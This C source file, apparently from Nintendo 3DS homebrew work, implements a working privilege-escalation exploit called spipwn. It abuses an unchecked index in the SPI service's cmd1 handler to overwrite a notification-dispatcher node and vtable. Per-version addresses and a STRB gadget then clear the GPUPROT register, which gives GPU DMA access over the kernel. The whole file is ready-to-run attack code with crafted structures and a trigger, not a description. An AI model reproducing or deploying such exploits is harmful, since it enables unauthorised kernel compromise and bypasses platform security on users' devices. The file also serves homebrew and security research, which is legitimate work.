#include "spipwn.h"
#include "lib/spi.h"
#include "lib/srv_pm.h"

/*
    This exploit is very simple, spi cmd1 writes to an array without checking its u8 index.
    While we're restricted to 0-255 for the index, we fortunately have the notification dispatcher
    node for notification 0x100 (termination) in range, which contains a linked list node & a vtable.

    We overwrite that node, create a new one to control register, trigger everything via termination
    or srv:pm PublishToAll (submodules ignore the notifications they don't handle), and do one controlled jump.

    We overwrite the LSByte of GPUPROT to 0, allowing us to do GPU DMA over the kernel.
*/

#define TRY(expr) if(R_FAILED(res = (expr))) return res;

#define SPIPWN_NOTIFICATION_ID  0x7F00 // anything with LSByte = 0 is fine
#define REG_GPUPROT_VA          0x1EC40140

// SPI versions
typedef enum SpiVersion {
    SPIVER_N3DS = 0,
    SPIVER_O3DS_80,
    SPIVER_O3DS_50,
    SPIVER_O3DS_20,
    SPIVER_O3DS_10,
} SpiVersion;

typedef struct SpiConstants {
    u32 arbWriteBase;   // first array in cmd1 handler
    u32 entryLocation;  // location of the entry notification 0x100
    u32 freeSpace;      // free space for us to create another entry
    u32 gadgetAddr;     // STRB gadget (see exploit code)
} SpiConstants;

typedef s32 LightLock;

typedef struct RecursiveLock
{
    LightLock lock;
    u32 threadId;
    u32 count;
} RecursiveLock;

typedef struct NotificationEntryListNode
{
    struct NotificationEntryListNode *prev;
    struct NotificationEntryListNode *next;
} NotificationEntryListNode;

typedef struct NotificationManager
{
    NotificationEntryListNode *firstNode;
    RecursiveLock lock;
} NotificationManager;

typedef struct NotificationEntry
{
    void **vtable;
    NotificationEntryListNode node;
    u32 notificationId;
} NotificationEntry;


static const SpiConstants s_constants[] = {
    [SPIVER_N3DS] = {
        .arbWriteBase   = 0x10501C,
        .entryLocation  = 0x1050BC,
        .freeSpace      = 0x105100,
        .gadgetAddr     = 0x103554,
    },
    [SPIVER_O3DS_80] = {
        .arbWriteBase   = 0x10501C,
        .entryLocation  = 0x1050B8,
        .freeSpace      = 0x1050FC,
        .gadgetAddr     = 0x103524,
    },
};

/// Get constants for exploit.
static const SpiConstants *spiGetConstants(void)
{
    if (IS_N3DS) {
        return &s_constants[SPIVER_N3DS];
    } else {
        switch (KERNEL_VERSION_MINOR) {
            case 0 ... 28:   // 1.0
                return NULL; // don't care
            case 29 ... 34:  // 2.x - 4.x
                return NULL; // don't care
            case 35 ... 43:  // 5.x - 7.x
                return NULL; // don't care
            default:        // 8.x+
                return &s_constants[SPIVER_O3DS_80];
        }
    }
}

/**
 * @brief Uses cmd1 to copy (and corrupt) data within a 256-byte range.
 * @param c SPI constants.
 * @param spiHandle Handle to an SPI service.
 * @param dstAddr Destination address in SPI, within a 256-byte range starting from c->arbWriteBase.
 * @param src Data to copy.
 * @param size Number of bytes to copy.
 */
static Result spiHaxCopy(const SpiConstants *c, Handle spiHandle, u32 dstAddr, const void *src, size_t size)
{
    /*
        int __fastcall cmd1(int a1, char a2, char a3)
        {
            byte_10501C[a2] = a3;
            byte_105022[a2] = 1;
            return 0;
        }
    */
    Result res = 0;
    const u8 *src8 = (const u8 *)src;
    size_t off = dstAddr - c->arbWriteBase;

    for (size_t i = 0; i < size; i++) {
        TRY(SPI_SetDeviceState(spiHandle, (u8)(off + i), src8[i]));
    }

    return res;
}

Result spipwn(Handle srvHandle)
{
    Result res = 0;
    Handle h, srvPmHandle;

    const SpiConstants *c = spiGetConstants();

    // Use a unused SPI service for this exploit
    TRY(spiDefInit(&h, srvHandle));

    // Get srv:pm handle
    TRY(srvPmInit(&srvPmHandle, srvHandle));

    u32 vtableLoc = c->freeSpace;
    u32 secondEntryLoc = c->freeSpace + 4;

    NotificationEntry firstEntry = {
        .vtable = NULL,
        .node = {
            // prev is (r3 + 4) when the gadget is executed: (CFG11_GPUPROT VA + 1) + 4 - 8
            .prev = (NotificationEntryListNode *)((REG_GPUPROT_VA + 1) + 4 - 8),
            .next = (NotificationEntryListNode *)(secondEntryLoc + 4),
        },
        .notificationId = 0, // avoid a match
    };

    NotificationEntry secondEntry = {
        .vtable = (void **)vtableLoc,
        .node = {
            // who cares
            .prev = NULL,
            .next = NULL,
        },
        .notificationId = SPIPWN_NOTIFICATION_ID, // anything with a LSByte of 0 and not used by any other service is fine here
    };

    // r1 = <notification ID>, r3 = see above. CFG11_GPUPROT supports 8-bit unaligned accesses
    /*
        .text:00103524 08 10 C3 E5 STRB            R1, [R3,#8]
        .text:00103528 10 10 9F E5 LDR             R1, =sub_1032C8
        .text:0010352C 03 00 A0 E1 MOV             R0, R3
        .text:00103530 2C F8 FF EA B               nullsub_1
     */

    // Set the crafted entries up
    TRY(spiHaxCopy(c, h, c->entryLocation, &firstEntry, sizeof(firstEntry)));
    TRY(spiHaxCopy(c, h, vtableLoc, &c->gadgetAddr, 4));
    TRY(spiHaxCopy(c, h, secondEntryLoc, &secondEntry, sizeof(secondEntry)));

    // Send desired notification to trigger function call
    TRY(SRVPM_PublishToAll(srvPmHandle, SPIPWN_NOTIFICATION_ID));

    // Wait a bit to ensure the write has been triggered.
    svcSleepThread(50 * 1000 * 1000LL);

    // Cleanup
    svcCloseHandle(srvPmHandle);
    svcCloseHandle(h);

    return res;
}
